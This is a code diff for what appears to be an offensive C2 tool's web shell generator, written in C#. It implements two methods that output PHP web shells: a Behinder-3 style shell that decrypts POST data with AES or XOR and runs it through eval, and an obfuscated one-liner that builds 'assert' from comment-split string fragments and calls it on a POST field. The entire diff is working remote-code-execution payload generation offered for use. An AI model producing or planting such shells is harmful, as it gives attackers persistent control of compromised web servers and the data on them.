@@ -99,7 +99,36 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private string GenBehinder3(string password)
         {
-            throw new NotImplementedException();
+            password = ST.GenerateMD5(password).Substring(0, 16);
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("<?php")
+              .AppendLine("@error_reporting(0);")
+              .AppendLine("session_start();")
+              .AppendLine(string.Format("    $key=\"{0}\";", password))
+              .AppendLine("    $_SESSION['k']=$key;")
+              .AppendLine("    session_write_close();")
+              .AppendLine("    $post=file_get_contents(\"php://input\");")
+              .AppendLine("    if(!extension_loaded('openssl'))")
+              .AppendLine("    {")
+              .AppendLine("        $t=\"base64_\".\"decode\";")
+              .AppendLine("        $post=$t($post.\"\");")
+              .AppendLine("        ")
+              .AppendLine("        for($i=0;$i<strlen($post);$i++) {")
+              .AppendLine("                 $post[$i] = $post[$i]^$key[$i+1&15]; ")
+              .AppendLine("                }")
+              .AppendLine("    }")
+              .AppendLine("    else")
+              .AppendLine("    {")
+              .AppendLine("        $post=openssl_decrypt($post, \"AES128\", $key);")
+              .AppendLine("    }")
+              .AppendLine("    $arr=explode('|',$post);")
+              .AppendLine("    $func=$arr[0];")
+              .AppendLine("    $params=$arr[1];")
+              .AppendLine("    class C{public function __invoke($p) {eval($p.\"\");}}")
+              .AppendLine("    @call_user_func(new C(),$params);")
+              .AppendLine("?>")
+              ;
+            return sb.ToString();
         }
 
         private string GenGodzilla(string password)
@@ -172,7 +201,8 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         private string GenOneWord6(string password)
         {
-            throw new NotImplementedException();
+            // 这个版本确实难以描述
+            return "<?php @$_=\"s\".\"s\"./*-/*-*/\"e\"./*-/*-*/\"r\";@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}[/*-/*-*/'" + password + "'/*-/*-*/]);?>";
         }
         private string GenOneWord7(string password)
         {
